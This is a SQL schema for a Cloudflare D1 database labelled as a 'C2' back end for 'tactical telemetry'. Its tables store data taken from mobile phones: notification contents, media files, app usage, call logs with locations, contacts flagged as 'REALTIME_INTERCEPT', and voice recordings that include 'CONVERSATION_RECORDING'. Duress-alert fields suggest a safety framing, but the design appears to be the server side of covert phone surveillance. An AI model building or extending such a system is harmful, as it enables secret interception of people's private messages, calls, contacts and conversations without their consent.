-- Cloudflare D1 SQL Schema for Tactical Telemetry & Operation C2

CREATE TABLE IF NOT EXISTS devices (
  device_id TEXT PRIMARY KEY,
  device_model TEXT,
  battery_level INTEGER DEFAULT 0,
  is_charging INTEGER DEFAULT 0,
  network_type TEXT,
  sim_info TEXT,
  active_app TEXT,
  last_seen INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS telemetry_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  battery_level INTEGER,
  is_charging INTEGER,
  network_type TEXT,
  sim_info TEXT,
  active_app TEXT,
  raw_payload TEXT,
  timestamp INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS notifications (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  package_name TEXT NOT NULL,
  app_name TEXT NOT NULL,
  title TEXT,
  content TEXT,
  post_time INTEGER NOT NULL,
  created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS media_records (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  media_id INTEGER,
  file_name TEXT NOT NULL,
  mime_type TEXT NOT NULL,
  media_type TEXT NOT NULL, -- image, video, audio, pdf
  size_bytes INTEGER NOT NULL,
  date_added_ms INTEGER NOT NULL,
  b2_url TEXT,
  created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS app_usage_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  package_name TEXT NOT NULL,
  app_name TEXT NOT NULL,
  duration_ms INTEGER DEFAULT 0,
  last_time_used INTEGER NOT NULL,
  created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS voice_events (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  event_id TEXT UNIQUE,
  device_id TEXT NOT NULL,
  threat_type TEXT NOT NULL, -- CONVERSATION_RECORDING, DISTRESS_SCREAM, DURESS_TRIGGER
  confidence_score REAL NOT NULL,
  duration_sec INTEGER NOT NULL,
  file_size_bytes INTEGER NOT NULL,
  b2_url TEXT,
  timestamp INTEGER NOT NULL,
  created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS call_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  phone_number TEXT NOT NULL,
  contact_name TEXT,
  call_type TEXT NOT NULL, -- INCOMING, OUTGOING, MISSED, REJECTED, BLOCKED, VOICEMAIL
  duration_seconds INTEGER DEFAULT 0,
  sim_slot INTEGER DEFAULT 1,
  carrier_name TEXT,
  geocoded_location TEXT,
  call_timestamp INTEGER NOT NULL,
  call_state TEXT DEFAULT 'COMPLETED',
  created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS duress_alerts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  alert_type TEXT NOT NULL, -- RED_DURESS_BEACON
  audio_event_id TEXT,
  timestamp INTEGER NOT NULL,
  created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS contacts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  contact_id TEXT,
  name TEXT,
  phone_number TEXT,
  phone_type TEXT,
  email TEXT,
  is_starred INTEGER DEFAULT 0,
  is_new_intercept INTEGER DEFAULT 0,
  sync_type TEXT DEFAULT 'INITIAL_SYNC', -- INITIAL_SYNC, REALTIME_INTERCEPT
  last_updated_ms INTEGER,
  lookup_key TEXT,
  created_at INTEGER NOT NULL,
  UNIQUE(device_id, contact_id, phone_number) ON CONFLICT REPLACE
);

-- Index optimization for fast C2 queries
CREATE INDEX IF NOT EXISTS idx_telemetry_dev_time ON telemetry_logs (device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_notif_dev_time ON notifications (device_id, post_time DESC);
CREATE INDEX IF NOT EXISTS idx_media_dev_time ON media_records (device_id, date_added_ms DESC);
CREATE INDEX IF NOT EXISTS idx_voice_dev_time ON voice_events (device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_calls_dev_time ON call_logs (device_id, call_timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_duress_dev_time ON duress_alerts (device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_contacts_dev_time ON contacts (device_id, last_updated_ms DESC);
